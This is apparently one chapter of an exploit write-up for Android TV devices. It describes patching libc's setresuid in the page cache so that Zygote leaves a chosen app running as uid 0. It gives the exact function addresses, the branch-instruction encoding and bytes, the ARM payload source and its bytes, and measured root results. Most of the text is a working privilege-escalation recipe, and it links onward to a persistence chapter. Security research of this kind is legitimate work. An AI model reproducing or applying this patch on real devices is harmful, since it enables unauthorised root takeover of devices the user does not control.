# 03 · Root takeover — patching `setresuid`

## Choosing the victim function

Zygote is the process that spawns every app, and it runs as root. In Android 8,
`ForkAndSpecializeCommon()` forks and the **child** performs, in order:

```
setgroups() → setresgid() → setresuid() → selinux_android_setcontext() → execve(app_process)
```

If `setresuid()` never actually drops privileges, the child execs `app_process` as
**uid 0**. That is the whole trick — the child is a normal app process in every other way.

`setresuid` in this `libc.so`:

```
vaddr 0x4a990 (ARM, 4-byte aligned), size 32
   4a990:  mov r12, r7          ; original prologue
   4a994:  mov r7, #208         ; __NR_setresuid
   4a998:  svc #0
   ...
```

## Where to put a payload

`setresuid` is only 32 bytes, far too small. The patch therefore replaces its first word
with a **branch** to a payload parked inside a large, unused function:

| Function | Address | Size | Why it is safe to clobber |
|---|---|---|---|
| `__ns_sprintrrf` (DNS debug printer) | `0x25a8d` | 7 724 B | never called in normal operation |

Payload placed at **`0x25a90`** (4-byte aligned inside that function).

Branch encoding, `b` ±32 MB:

```
at 0x4a990 .. 0x25a90
offset  = 0x25a90 - (0x4a990 + 8) = -0x24F08      → imm24 = 0xFF6C3E
instr   = 0xEA000000 | imm24      = 0xEAFF6C3E
bytes on disk (LE)                = 3E 6C FF EA
```

## The payload — and why it is *targeted*

Payload source: [`exploit/payloads/setresuid-targeted.s`](../exploit/payloads/setresuid-targeted.s)

```asm
_start:
    movw r1, #10014        @ the target app's uid (u0_a14)
    cmp  r0, r1
    bne  real
    mov  r0, #0            @ pretend success: the app keeps uid 0
    bx   lr
real:
    mov  r7, #208          @ __NR_setresuid — everyone else behaves normally
    svc  #0
    bx   lr
```

⇒ 32 bytes: `1E 17 02 E3 | 01 00 50 E1 | 01 00 00 1A | 00 00 A0 E3 | 1E FF 2F E1 | D0 70 A0 E3 | 00 00 00 EF | 1E FF 2F E1`

### The first version was a disaster (instructive)

Returning `0` unconditionally means **every** app on the TV runs as uid 0 — `SystemUI`,
`Settings`, Play Services, everything. In practice that means:

* apps writing files they should not,
* package-manager / keychain SQLite failures,
* a soft reboot and a brief period where the TV fell off the network entirely.

Measuring the fix is trivial and satisfying:

```console
$ adb shell ps -A -o PID,UID,LABEL,NAME | grep -E "tv.settings|pwn"
2260  1000 u:r:system_app:s0               com.android.tv.settings   ← normal
5761     0 u:r:untrusted_app:s0:c512,c768  com.pwn.probe            ← root
```

## Result

* Our app's process: `uid=0`, still `u:r:untrusted_app:s0` (SELinux untouched).
* Every other process: normal uid, normal behaviour, TV stable.
* Reverting is free: the patch lives **only in the page cache**, so a reboot restores the
  original `libc.so`.

## What uid 0 buys you, and what it does not

Measured from the resulting shell:

```console
--- settings put global ... ---   rc=0        ✅ framework root
--- cmd package list ---          works       ✅
--- pm grant <pkg> <perm> ---     permission check passes ✅
--- read /system/bin/logd ---     no          ❌ SELinux
--- write /data/local/tmp ---      EACCES     ❌ SELinux
```

Android's `checkComponentPermission()` returns GRANTED for uid 0, so the entire *framework*
is open. The *filesystem* is still filtered by the SELinux domain — see
[06 · Limitations](06-limitations-and-roadmap.md).

Next: **[04 · Persistence](04-persistence.md)**.
